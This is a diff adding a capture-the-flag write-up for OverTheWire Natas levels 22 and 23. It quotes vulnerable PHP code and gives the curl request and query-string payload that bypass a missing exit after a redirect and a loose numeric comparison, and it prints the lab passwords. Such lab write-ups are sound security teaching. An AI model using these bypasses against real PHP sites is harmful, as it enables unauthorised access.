@@ -475,11 +475,75 @@ Username: natas22
 Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
 ```
 
+### Level 22 - PHP `header()` exploit
+```
+http://natas22.natas.labs.overthewire.org/ natas22 chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+```
 
+Vulnerable source:
+```php
+if(array_key_exists("revelio", $_GET)) {
+  if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
+    header("Location: /"); 
+  } 
+} 
+```
+
+`header()` will just add a HTTP header `Location: /` but won't redirect. Only browsers will perfom the redirect. So let's use something other than a browser. `curl` maybe?
+
+```bash
+$ curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ "http://natas22.natas.labs.overthewire.org?revelio=1"
+You are an admin. The credentials for the next level are:<br>
+<pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
+```
+
+Reference:
+- [http://php.net/manual/en/function.header.php](http://php.net/manual/en/function.header.php)
+
+### Level 23 - String comparison
+```
+http://natas23.natas.labs.overthewire.org/ natas23 D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+```
+
+PHP can be used to compare a string to a number, this is the vulnerability for this exercice:
+```php
+if(
+    strstr($_REQUEST["passwd"],"iloveyou") && 
+    $_REQUEST["passwd"] > 10
+  ){
+    // good boy
+}
+```
+
+Which translated in plain English gives "if the password contains 'iloveyou' and the integer conversion of the password is greater than 10"
+
+The integer conversion uses `intval` (except if there's a `.`, hence it uses `floatval`). `intval` will parse the beginning of the string:
+```bash
+$ php -r "var_dump(intval('5text here'));"
+int(5)
+$ php -r "var_dump(intval('5text here') > 4);" # equivalent to "('5text here') > 4"
+bool(true)
+```
+> Internally, `intval` uses the Unix C function `strtod(3)`.
+
+So use any number greater than 10, followed by "iloveyou", e.g. `http://natas23.natas.labs.overthewire.org/?passwd=69iloveyousomuch`:
+```
+Username: natas24
+Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+```
+
+Reference:
+- http://php.net/manual/en/language.types.string.php#language.types.string.conversion
+- https://linux.die.net/man/3/strtod
+
+
+Reference:
+- http://php.net/manual/en/function.strstr.php
 
 ### Level  -
 ```
-http://natas1.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
+http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
 ```
 ``
 
